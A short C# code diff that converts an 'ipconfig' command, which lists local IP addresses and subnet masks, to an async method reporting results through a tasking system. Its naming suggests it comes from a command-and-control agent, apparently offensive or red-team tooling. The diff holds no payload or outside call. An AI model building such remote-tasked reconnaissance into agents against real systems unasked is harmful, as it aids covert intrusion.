@@ -1,4 +1,5 @@
 ﻿using Engineer.Commands;
+using Engineer.Functions;
 using Engineer.Models;
 using System;
 using System.Collections.Generic;
@@ -12,7 +13,7 @@ namespace Engineer.Commands
     {
         public override string Name => "ipconfig";
 
-        public override string Execute(EngineerTask task)
+        public override async Task Execute(EngineerTask task)
         {
             //get all of the ip addresses and subnet masks
             var ipAddresses = System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces()
@@ -26,11 +27,7 @@ namespace Engineer.Commands
             {
                 output.AppendLine(ipAddress);
             }
-            return output.ToString();
-
-
-
-
+            Tasking.FillTaskResults(output.ToString(),task,EngTaskStatus.Complete);
         }
     }
 }
